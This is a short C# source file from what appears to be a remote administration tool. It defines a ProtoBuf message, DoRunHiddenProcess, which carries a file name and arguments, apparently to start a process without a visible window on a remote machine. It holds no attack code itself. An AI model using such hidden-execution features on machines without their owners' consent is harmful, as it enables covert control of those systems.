using ProtoBuf;

namespace Quasar.Common.Messages
{
    [ProtoContract]
    public class DoRunHiddenProcess : IMessage
    {
        [ProtoMember(1)]
        public string FileName { get; set; }

        [ProtoMember(2)]
        public string Arguments { get; set; }
    }
}
